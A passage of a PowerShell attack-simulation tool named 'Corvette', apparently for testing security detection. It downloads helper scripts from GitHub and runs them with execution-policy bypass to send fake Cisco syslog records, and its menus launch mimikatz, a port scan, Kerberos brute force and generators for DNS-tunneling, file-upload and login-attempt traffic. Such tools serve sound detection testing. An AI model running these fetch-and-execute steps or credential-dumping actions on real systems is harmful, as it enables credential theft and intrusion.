        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    $script:PATTERN_IPV4_ADDR `
                                    "Please retype a valid IPv4 address"

        if (AskYesNo "Are you sure you want to run?") {
            $args = Quote @("-ExecutionPolicy", "Bypass", $script_file,
                            "-SyslogHost", $syslog_host,
                            "-SyslogPort", $syslog_port,
                            "-SyslogProtocol", $syslog_protocol.ToUpper(),
                            "-SourceIP", $source_ip,
                            "-DestinationIP", $destination_ip)
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
    
    [void]RunLargeUpload() {
        $file_name = "syslog-cisco-asa-large-upload.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    $script:PATTERN_IPV4_ADDR `
                                    "Please retype a valid IPv4 address"
        $destination_port = ReadInput "Destination Port" `
                                      $null `
                                      "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                      "Please retype a valid port number"

        if (AskYesNo "Are you sure you want to run?") {
            $args = Quote @("-ExecutionPolicy", "Bypass", $script_file,
                            "-SyslogHost", $syslog_host,
                            "-SyslogPort", $syslog_port,
                            "-SyslogProtocol", $syslog_protocol.ToUpper(),
                            "-SourceIP", $source_ip,
                            "-DestinationIP", $destination_ip,
                            "-DestinationPort", $destination_port)
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
    
    [void]RunAnyConnectAuth() {
        $file_name = "syslog-cisco-any-connect-authlogs.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $user_ip = ReadInput "Authentication User IP" `
                             "" `
                             $script:PATTERN_IPV4_ADDR `
                             "Please retype a valid IPv4 address"
        $user_id = ReadInput "Authentication User ID (Optional)" ""
        $log_type = ReadInput "Log Type" "all" ".+"
        $numof_logs = ParseNumber(ReadInput "Number of log records" `
                                            "100" `
                                            "^[0-9]+$" `
                                            "Please retype a valid number")
        $user_group = "group"

        if (AskYesNo "Are you sure you want to run?") {
            $args = @("-ExecutionPolicy", "Bypass", $script_file,
                      "-SyslogHost", $syslog_host,
                      "-SyslogPort", $syslog_port,
                      "-SyslogProtocol", $syslog_protocol.ToUpper(),
                      "-UserIP", $user_ip,
                      "-UserGroup", $user_group,
                      "-Count", [string]$numof_logs,
                      "-LogType", $log_type)
            if (![string]::IsNullOrEmpty($user_id)) {
                $args += @("-UserID", $user_id)
            }
            $args = Quote $args
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
}

class Menu {
    [Properties]$props
    
    Menu([Properties]$props) {
        $this.props = $props
    }

    hidden [bool]LaunchUserModeCommand($cmd) {
        switch ($cmd) {
            "c" {
                [ConfigureSettings]::New($this.props).Run()
            }
            "0" {
                <#
                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($this.props.my_script))
                $args = Quote @("-e", $script)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
                #>
                $path = $this.props.MakeSureScriptFileExists()
                $args = Quote @("-ExecutionPolicy", "Bypass", $path)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
            }
            "1" {
                [SetupTools]::New($this.props).Run()
            }
            "2" {
                Start-Process -FilePath "explorer.exe" -ArgumentList @($this.props.home_dir)
            }
            "3" {
                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
            }
            "4" {
                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
            }
            "5" {
                $cargs = @("/d", $this.props.home_dir)
                $args = @("/K,", "cd") + (Quote $cargs)
                Start-Process -FilePath "cmd.exe" -verb runas -ArgumentList $args
            }
            "6" {
                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("cd " + (Quote $this.props.home_dir)))
                $args = @("-NoExit", "-e", $script)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
            }
            "7" {
                [Mimikatz]::New($this.props).Run($false)
            }
            "8" {
                [Mimikatz]::New($this.props).Run($true)
            }
            "9" {
                [PortScan]::New($this.props).Run()
            }
            "10" {
                [KerberosBruteForce]::New($this.props).Run()
            }
            "11" {
                [WildFireTestPE]::New($this.props).Run()
            }
            "12" {
                [FortigateLogs]::New($this.props).Run()
            }
            "13" {
                [CiscoLogs]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenUserModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " c) Configure settings"
            Write-Host " 0) Run as administrator"
            Write-Host " 1) Download/Install tools"
            Write-Host " 2) Open an explorer"
            Write-Host " 3) Create a new command shell"
            Write-Host " 4) Create a new powershell"
            Write-Host " 5) Create a new command shell (Run as administrator)"
            Write-Host " 6) Create a new powershell (Run as administrator)"
            Write-Host " 7) Run mimikatz"
            Write-Host " 8) Run mimikatz (Run as administrator)"
            Write-Host " 9) Run port scan"
            Write-Host "10) Run Kerberos Brute Force"
            Write-Host "11) Run WildFire Test PE"
            Write-Host "12) Send Fortigate Logs"
            Write-Host "13) Send Cisco Logs"
            try {
                while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [bool]LaunchAdminModeCommand($cmd) {
        switch ($cmd) {
            "c" {
                [ConfigureSettings]::New($this.props).Run()
            }
            "0" {
                [SetupTools]::New($this.props).Run()
            }
            "1" {
                Start-Process -FilePath "explorer.exe" -ArgumentList @($this.props.home_dir)
            }
            "2" {
                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
            }
            "3" {
                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
            }
            "4" {
                [Mimikatz]::New($this.props).Run($false)
            }
            "5" {
                [PortScan]::New($this.props).Run()
            }
            "6" {
                [KerberosBruteForce]::New($this.props).Run()
            }
            "7" {
                [WildFireTestPE]::New($this.props).Run()
            }
            "8" {
                [DnsTunneling]::New($this.props).Run()
            }
            "9" {
                [FtpFileUpload]::New($this.props).Run()
            }
            "10" {
                [HttpFileUpload]::New($this.props, $false).Run()
            }
            "11" {
                [HttpFileUpload]::New($this.props, $true).Run()
            }
            "12" {
                [HttpUnauthorizedLoginAttempts]::New($this.props).Run()
            }
            "13" {
                [SmbUnauthorizedLoginAttempts]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenAdminModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " c) Configure settings"
            Write-Host " 0) Download/Install tools"
            Write-Host " 1) Open an explorer"
            Write-Host " 2) Create a new command shell"
            Write-Host " 3) Create a new powershell"
            Write-Host " 4) Run mimikatz"
            Write-Host " 5) Run port scan"
            Write-Host " 6) Run Kerberos Brute Force"
            Write-Host " 7) Run WildFire Test PE"
            Write-Host " 8) Generate DNS tunneling packets"
            Write-Host " 9) Generate FTP file upload packets"
            Write-Host "10) Generate HTTP file upload packets"
            Write-Host "11) Generate HTTPS file upload packets"
            Write-Host "12) Generate HTTP unauthorized login attempts packets"
            Write-Host "13) Generate SMB unauthorized login attempts packets"
            try {
                while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
            } catch {
                Write-Host $_
            }
        }
    }

    [void]OpenMenu() {
        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $this.OpenAdminModeMenu()
        } else {
            $this.OpenUserModeMenu()
        }
    }
}

$props = [Properties]::New($MyInvocation)
$props.Initialize()

[Menu]::New($props).OpenMenu()
